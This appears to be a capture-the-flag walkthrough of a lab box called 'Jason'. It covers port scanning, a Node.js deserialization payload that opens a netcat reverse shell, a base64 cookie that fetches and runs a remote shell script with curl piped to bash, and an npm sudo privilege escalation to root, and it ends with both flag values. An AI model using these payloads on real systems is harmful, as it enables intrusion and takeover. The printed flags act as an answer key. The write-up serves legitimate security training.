# Box Name

## Jason

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
 ## nmap
 ```bash
 rustscan -a 10.10.152.126 --ulimit 5000                  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.152.126:22
Open 10.10.152.126:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=10/8%Time=615FFE36%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDat
SF:e:\x20Sat,\x2009\x20Oct\x202021\x2001:14:52\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<html><head>\n<title>Horror\x20LLC</title>\n<style>\n\x20\x2
SF:0body\x20{\n\x20\x20\x20\x20background:\x20linear-gradient\(253deg,\x20
SF:#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20\x20\x20\x20background-size:\x2
SF:0300%\x20300%;\n\x20\x20\x20\x20-webkit-animation:\x20Background\x2010s
SF:\x20ease\x20infinite;\n\x20\x20\x20\x20-moz-animation:\x20Background\x2
SF:010s\x20ease\x20infinite;\n\x20\x20\x20\x20animation:\x20Background\x20
SF:10s\x20ease\x20infinite;\n\x20\x20}\n\x20\x20\n\x20\x20@-webkit-keyfram
SF:es\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x2
SF:0background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20
SF:50%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x20100%\x2050%\n
SF:\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20b
SF:ackground-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x2
SF:0\n\x20\x20@-moz-keyframes\x20Background\x20{\n\x20\x20\x20\x200%\x20{\
SF:n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x2
SF:0\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-po
SF:sition:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\
SF:x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x20\
SF:x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyframes\x20Background\x20{\n\x20\
SF:x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\
SF:x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x
SF:20\x20background-posi")%r(HTTPOptions,E4B,"HTTP/1\.1\x20200\x20OK\r\nCo
SF:ntent-Type:\x20text/html\r\nDate:\x20Sat,\x2009\x20Oct\x202021\x2001:14
SF::53\x20GMT\r\nConnection:\x20close\r\n\r\n<html><head>\n<title>Horror\x
SF:20LLC</title>\n<style>\n\x20\x20body\x20{\n\x20\x20\x20\x20background:\
SF:x20linear-gradient\(253deg,\x20#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20
SF:\x20\x20\x20background-size:\x20300%\x20300%;\n\x20\x20\x20\x20-webkit-
SF:animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\x20-
SF:moz-animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\
SF:x20animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20}\n\x2
SF:0\x20\n\x20\x20@-webkit-keyframes\x20Background\x20{\n\x20\x20\x20\x200
SF:%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20
SF:\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20backgr
SF:ound-position:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\
SF:x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x
SF:20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@-moz-keyframes\x20Background
SF:\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-posi
SF:tion:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x
SF:20\x20\x20\x20\x20background-position:\x20100%\x2050%\n\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20background-positi
SF:on:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyf
SF:rames\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20
SF:\x20background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\
SF:x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-posi");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


---
## Initial Foothold
---
 ## javascript deserialization
 ### {{https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/}}
	 
 ```javascript
 _$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP PORT> >/tmp/f\", function puts(error, stdout, stderr) {});\n}()
```

 ## convert to base64
```
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgMTAuMTMuMTMuNTU6OTAwMS9zaGVsbC5zaCB8IGJhc2gnLGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikge2NvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIn0=
```

 ## replace current value of cookie with new value to get a [[revshell]]
```bash
 pwncat-cs -lp 1234                      
[16:18:58] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
[16:29:49] received connection from 10.10.152.126:46140                                                                                                                                                                          bind.py:84
[16:29:54] 10.10.152.126:46140: registered new host w/ db                                                                                                                                                                    manager.py:957
(local) pwncat$                                                                                                                                                                                                                            
(remote) dylan@jason:/opt/webapp$ id;whoami
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
dylan
(remote) dylan@jason:/opt/webapp$ 

```


## Privilege Escalation

```bash
(remote) dylan@jason:/home/dylan$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
(remote) dylan@jason:/home/dylan$ 
```

 ## [[gtfobins]] npn
```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

```bash
(remote) dylan@jason:/home/dylan$ TF=$(mktemp -d)
(remote) dylan@jason:/home/dylan$ echo '{"scripts": {"preinstall": "/bin/bash"}}' > $TF/package.json
(remote) dylan@jason:/home/dylan$ sudo npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.bWByfwICls
> /bin/bash

root@jason:/tmp/tmp.bWByfwICls# 

```


 ## cat flags
```bash
root@jason:/tmp/tmp.bWByfwICls# cat /home/dylan/user.txt
'0ba48780dee9f5677a4461f588af217c'
root@jason:/tmp/tmp.bWByfwICls# cat /root/root.txt
'2cd5a9fd3a0024bfa98d01d69241760e'
root@jason:/tmp/tmp.bWByfwICls#
```